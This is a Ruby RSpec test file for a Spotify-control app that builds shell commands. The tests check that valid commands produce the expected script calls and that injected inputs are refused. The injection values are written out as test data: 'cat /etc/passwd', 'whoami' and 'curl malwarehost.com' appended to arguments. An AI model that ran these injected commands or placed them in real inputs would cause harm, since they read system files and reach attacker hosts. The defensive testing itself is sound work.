ENV["RACK_ENV"] = "test"

require "rspec"
require "pry-byebug"
require_relative "../app"
require_relative "../spotify"

describe "Spotify" do
  let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands

  shared_examples_for "a valid command" do
    it "executes the correct Shpotify command" do
      expect(Spotify).to receive(:`).with(expected_command).and_return(command_stub)
      subject
    end
  end

  shared_examples_for "an invalid command" do
    it "does not call a system command" do
      expect(Spotify).to_not receive(:`)
      subject
    end

    it "calls invalid_command" do
      expect(Spotify).to receive(:invalid_command)
      subject
    end
  end

  describe ".stop" do
    subject { Spotify.stop }
    let(:expected_command) { "./spotify.sh stop" }

    it_behaves_like "a valid command"
  end

  describe ".pause" do
    subject { Spotify.pause }
    let(:expected_command) { "./spotify.sh pause" }

    it_behaves_like "a valid command"
  end

  describe ".next" do
    subject { Spotify.next }
    let(:expected_command) { "./spotify.sh next" }

    it_behaves_like "a valid command"
  end

  describe ".skip" do
    subject { Spotify.skip }
    # skip is an alias of next
    let(:expected_command) { "./spotify.sh next" }

    it_behaves_like "a valid command"
  end

  describe ".prev" do
    subject { Spotify.prev }
    let(:expected_command) { "./spotify.sh prev" }

    it_behaves_like "a valid command"
  end

  describe ".replay" do
    subject { Spotify.replay }
    let(:expected_command) { "./spotify.sh replay" }

    it_behaves_like "a valid command"
  end

  describe ".pos" do
    subject { Spotify.pos(time_in_seconds) }

    context "with an integer" do
      let(:time_in_seconds) { rand(0..100) }
      let(:expected_command) { "./spotify.sh pos #{time_in_seconds}" }

      it_behaves_like "a valid command"
    end

    context "with missing time" do
      let(:time_in_seconds) { nil }
      it_behaves_like "an invalid command"
    end

    context "when not a number" do
      let(:time_in_seconds) { "some string" }
      it_behaves_like "an invalid command"
    end
  end

  describe ".vol" do
    subject { Spotify.vol(vol_args) }
    let(:expected_command) { "./spotify.sh vol #{vol_args}".rstrip }

    context "up" do
      let(:vol_args) { "up" }

      it_behaves_like "a valid command"
    end

    context "down" do
      let(:vol_args) { "down" }

      it_behaves_like "a valid command"
    end

    context "with a volume integer" do
      # to_s since args come from app.rb as strings
      let(:vol_args) { rand(0..100).to_s }

      it_behaves_like "a valid command"
    end

    context "with no vol" do
      # Show current volume
      subject { Spotify.vol }
      let(:expected_command) { "./spotify.sh vol" }
      it_behaves_like "a valid command"
    end

    context "with invalid input" do
      let(:vol_args) { "30; cat /etc/passwd" }
      it_behaves_like "an invalid command"
    end
  end

  describe ".status" do
    subject { Spotify.status }
    let(:expected_command) { "./spotify.sh status" }

    it_behaves_like "a valid command"
  end

  describe ".share" do
    subject { Spotify.share(share_args) }
    let(:expected_command) { "./spotify.sh share #{share_args}".rstrip }

    context "empty string" do
      let(:share_args) { "" }

      it_behaves_like "a valid command"
    end

    context "uri" do
      let(:share_args) { "uri" }
      let(:expected_command) { "./spotify.sh share #{share_args}" }

      it_behaves_like "a valid command"
    end

    context "url" do
      let(:share_args) { "url" }
      let(:expected_command) { "./spotify.sh share url" }

      it_behaves_like "a valid command"
    end
  end

  describe ".toggle" do
    subject { Spotify.toggle(toggle_args) }
    let(:expected_command) { "./spotify.sh toggle #{toggle_args}".rstrip }

    context "empty string" do
      let(:toggle_args) { "" }

      it_behaves_like "an invalid command"
    end

    context "invalid toggle" do
      let(:toggle_args) { "invalid" }

      it_behaves_like "an invalid command"
    end

    context "shuffle" do
      let(:toggle_args) { "shuffle" }
      let(:expected_command) { "./spotify.sh toggle #{toggle_args}" }

      it_behaves_like "a valid command"
    end

    context "repeat" do
      let(:toggle_args) { "repeat" }
      let(:expected_command) { "./spotify.sh toggle repeat" }

      it_behaves_like "a valid command"
    end
  end

  describe ".play" do
    subject { Spotify.play(play_args) }
    let(:expected_command) { "./spotify.sh play #{play_args}" }

    context "with no args" do
      subject { Spotify.play }
      let(:expected_command) { "./spotify.sh play" }
      it_behaves_like "a valid command"
    end

    context "search by song" do
      let(:play_args) { "like light to the flies" }
      it_behaves_like "a valid command"
    end

    context "search by artist" do
      let(:play_args) { "artist Trivium" }
      it_behaves_like "a valid command"
    end

    context "search by album" do
      let(:play_args) { "album In Waves" }
      it_behaves_like "a valid command"
    end

    context "search by playlist" do
      let(:play_args) { "list this.is_my playlist" }
      it_behaves_like "a valid command"
    end

    context "search by uri" do
      let(:play_args) { "uri spotify:track:4hk0OBunwz04gknkfNLzUn" }
      it_behaves_like "a valid command"
    end

    context "command injection with &&" do
      let(:play_args) { "artist Trivium && whoami" }

      it_behaves_like "an invalid command"
    end

    context "command injection with ||" do
      let(:play_args) { "list some_playlist || curl malwarehost.com" }

      it_behaves_like "an invalid command"
    end

    context "command injection with ;" do
      let(:play_args) { "list some_playlist; curl malwarehost.com" }

      it_behaves_like "an invalid command"
    end
  end

  describe ".quit" do
    subject { Spotify.quit }
    let(:expected_command) { "./spotify.sh quit" }

    it_behaves_like "a valid command"
  end

  describe ".restart" do
    subject { Spotify.restart }
    let(:quit) { "./spotify.sh quit" }
    let(:open) { "open #{Spotify::APP_PATH}" }

    before { allow(Spotify).to receive(:sleep) }

    it "restarts Spotify" do
      expect(Spotify).to receive(:`).with(quit).once
      expect(Spotify).to receive(:`).with(open).once.and_return(command_stub)
      subject
    end
  end
end
